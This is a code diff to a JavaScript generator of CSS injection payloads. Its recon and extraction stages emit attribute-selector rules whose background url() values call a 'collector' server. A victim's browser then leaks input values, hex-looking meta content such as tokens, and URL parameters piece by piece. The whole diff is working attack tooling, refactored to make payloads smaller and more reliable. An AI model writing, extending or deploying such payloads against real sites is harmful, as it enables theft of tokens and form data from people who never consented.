@@ -27,7 +27,10 @@
 // separately, so tests can evaluate exactly the rules the CSS is made from.
 (function (root) {
   const P = typeof module !== 'undefined' && module.exports ? require('./payload') : root;
-  const { ANCHOR_LENGTH, MAX_LAYERS_PER_BOX, PSEUDO_BOXES, shortName, allHex } = P;
+  const {
+    ANCHOR_LENGTH, MAX_LAYERS_PER_BOX, PSEUDO_BOXES, shortName, allHex,
+    attributeValue, collectorURL, backgroundList,
+  } = P;
 
   // --- wordlists ---------------------------------------------------------------
   // All names match /^[\w-]+$/ so they can go straight into URLs. Matching is
@@ -121,11 +124,10 @@
   // where test = [name] (present) or [name, op, value, caseInsensitive].
   // `is` passes if any of its tests pass, `not` fails if any of its tests pass.
 
-  const cssString = s => '"' + s.replace(/["\\]/g, '\\$&') + '"';
-
   function renderTest([name, op, value, ci]) {
     if (!op) return `[${name}]`;
-    return `[${name}${op}${cssString(value)}${ci ? ' i' : ''}]`;
+    const v = attributeValue(value);
+    return `[${name}${op}${v}${ci ? (v.startsWith('"') ? 'i' : ' i') : ''}]`;
   }
 
   // `wrap` moves every attribute test inside :is(), leaving only the tag at
@@ -150,7 +152,10 @@
   //   form  the <form> the matched element is a direct child of
   //   html  the root element, if the match exists anywhere
   function subjectSelector(scope, match) {
-    if (scope === 'self') return renderMatch(match, true);
+    // Nested extraction rules already have a scoped parent selector. The
+    // extra :is() around each attribute test adds five bytes per probe and
+    // does not improve Chrome's stylesheet construction time here.
+    if (scope === 'self') return renderMatch(match, match.tag !== '&');
     if (scope === 'form') return `form:has(>${renderMatch(match)})`;
     return `html:has(${renderMatch(match)})`;
   }
@@ -164,15 +169,41 @@
 
   // Every rule sets its own custom property to a url() and every host lists
   // its properties in one `background`, so each matching rule is one request.
-  // Hosts are split over the element and its ::before/::after because Chrome
-  // crashes with too many layers on one box.
+  // Empty fallbacks omit unmatched layers. Keep the conservative split over
+  // the element and its pseudo-elements, and the existing host capacity limits.
   function render(payload, server) {
+    server = collectorURL(server);
     const css = [];
-    if (payload.displayMeta) css.push('head,meta{display:block}');
+    let group = null;
+    let ruleCount = 0;
+    const closeGroup = () => {
+      if (group) css.push('}');
+      group = null;
+    };
+    const room = count => {
+      if (ruleCount + count <= MAX_RULES_PER_SHEET) return;
+      closeGroup();
+      css.push('</style><style>');
+      ruleCount = 0;
+    };
+    const emit = rule => {
+      room(1);
+      css.push(rule);
+      ruleCount++;
+    };
+    if (payload.displayMeta) emit('head,meta{display:block}');
     for (const r of payload.rules) {
-      if (css.length && css.length % MAX_RULES_PER_SHEET === 0) css.push('</style><style>');
-      css.push(`${subjectSelector(r.scope, r.match)}{--${r.prop}:url(${server}/${r.path})}`);
+      if (group !== (r.group || null)) closeGroup();
+      room(r.group && !group ? 2 : 1);
+      if (r.group && !group) {
+        group = r.group;
+        css.push(`${renderMatch(group, true)}{`);
+        ruleCount++;
+      }
+      const match = r.group ? { tag: '&', ...r.test } : r.match;
+      emit(`${subjectSelector(r.scope, match)}{--${r.prop}:url(${server}/${r.path}),}`);
     }
+    closeGroup();
     const hosts = new Map();
     for (const h of payload.hosts) {
       const sel = hostSelector(h);
@@ -181,14 +212,13 @@
       for (const p of h.props) props.push(p); // too many to spread
     }
     for (const [sel, props] of hosts) {
-      const layers = props.map(p => `var(--${p},none)`);
-      const boxCount = Math.ceil(layers.length / MAX_LAYERS_PER_BOX);
+      const boxCount = Math.ceil(props.length / MAX_LAYERS_PER_BOX);
       if (boxCount > 1 + PSEUDO_BOXES.length) throw new Error(`too many layers for ${sel}`);
-      const perBox = Math.ceil(layers.length / boxCount);
+      const perBox = Math.ceil(props.length / boxCount);
       for (let i = 0; i < boxCount; i++) {
-        const background = `background:${layers.slice(i * perBox, (i + 1) * perBox).join(',')}`;
-        if (i === 0) css.push(`${sel}{${background}}`);
-        else css.push(`${sel}${PSEUDO_BOXES[i - 1]}{content:"";display:inline-block;${background}}`);
+        const background = `background:${backgroundList(props.slice(i * perBox, (i + 1) * perBox))}`;
+        if (i === 0) emit(`${sel}{${background}}`);
+        else emit(`${sel}${PSEUDO_BOXES[i - 1]}{content:"";display:inline-block;${background}}`);
       }
     }
     return `<style>${css.join('')}</style>`;
@@ -222,9 +252,11 @@
     const rules = [];
     const hostProps = { html: [], form: [], meta: [], a: [], data: [] };
     let n = 0;
-    const probe = (host, scope, match, kind, name) => {
-      const prop = 'r' + shortName(n++);
-      rules.push({ scope, match, prop, path: `r/${kind}/${name}` });
+    const probe = (host, scope, match, kind, name, group, test) => {
+      // Recon CSS can remain on the page during extraction. Its inherited
+      // properties must not collide with extraction's names (no hyphens).
+      const prop = 'r-' + shortName(n++);
+      rules.push({ scope, match, prop, path: `r/${kind}/${name}`, group, test });
       hostProps[host].push(prop);
     };
 
@@ -232,7 +264,14 @@
       INPUT_NAMES.forEach(w => {
         probe('html', 'html', inputMatch(w), 'i', w);
         probe('form', 'form', inputMatch(w), 'if', w);
-        probe('html', 'html', withTests(inputMatch(w), hexOnly('value')), 'ih', w);
+      });
+      // The long hex-only test is identical for every name. Factor it into
+      // one parent rule; these probes have distinct properties, so moving
+      // them together does not change cascade order or the requests.
+      const group = { tag: 'input', ...hexOnly('value') };
+      INPUT_NAMES.forEach(w => {
+        const test = { attrs: inputMatch(w).attrs };
+        probe('html', 'html', withTests(inputMatch(w), hexOnly('value')), 'ih', w, group, test);
       });
       probe('html', 'html', {
         tag: 'input',
@@ -243,7 +282,11 @@
     if (targets.has('meta')) {
       META_NAMES.forEach(w => {
         probe('meta', 'self', metaMatch(w), 'm', w);
-        probe('meta', 'self', withTests(metaMatch(w), hexOnly('content')), 'mh', w);
+      });
+      const group = { tag: 'meta', ...hexOnly('content') };
+      META_NAMES.forEach(w => {
+        const test = { attrs: metaMatch(w).attrs };
+        probe('meta', 'self', withTests(metaMatch(w), hexOnly('content')), 'mh', w, group, test);
       });
     }
     if (targets.has('url')) {
@@ -361,12 +404,13 @@
   }
 
   // Each field: { id, kind, name, host, windowSize }. Field ids namespace the
-  // URLs; the props share one counter so fields never clash.
+  // URLs; the props share one counter so fields never clash. Rules retain full
+  // matches for evaluation; group/test also express them as nested CSS.
   //
   // Hosts are shared per kind of element, not per field: two fields in the
   // same form (or two params on the same link) would otherwise each set a
   // `background` on one element and the later would wipe out the earlier.
-  // Props a field doesn't set on an element fall back to `none`.
+  // Props a field doesn't set on an element contribute nothing to the list.
   function extractPayload(fields) {
     const rules = [];
     const shared = new Map();
@@ -383,25 +427,23 @@
       if (!shared.has(key)) shared.set(key, new Set());
       const props = shared.get(key);
       const rule = (test, prop, path) => {
-        rules.push({ scope, match: withTests(match, { attrs: [test] }), prop, path: `b/${id}/${path}` });
+        rules.push({ scope, match: withTests(match, { attrs: [test] }), group: match,
+          test: { attrs: [test] }, prop, path: `b/${id}/${path}` });
         props.add(prop);
       };
 
       for (const a of allHex(ANCHOR_LENGTH)) {
         if (whole) rule([attr, '^=', a], `s${id}-`, 's/' + a);
         else {
-          for (const sep of '?&') {
-            rules.push({
-              scope,
-              match: { tag: match.tag, attrs: [[attr, '*=', `${sep}${field.name}=${a}`, true]] },
-              prop: `s${id}-`,
-              path: `b/${id}/s/${a}`,
-            });
-          }
+          // Both separators set the same property and URL at the same
+          // specificity, so one :is() retains both probes and their order.
+          const test = { is: [...'?&'].map(sep => [attr, '*=', `${sep}${field.name}=${a}`, true]) };
+          rules.push({ scope, match: { tag: match.tag, ...test }, group: match,
+            test, prop: `s${id}-`, path: `b/${id}/s/${a}` });
           props.add(`s${id}-`);
         }
       }
-      for (const w of allHex(k)) rule([attr, '*=', w], 'b' + shortName(n++), w);
+      for (const w of allHex(k)) rule([attr, '*=', w], shortName(n++), w);
       for (const a of allHex(ANCHOR_LENGTH)) {
         rule([attr, '$=', a], `e${id}-`, 'e/' + a);
         // A URL param usually ends at the next "&" (or "#"), but other params
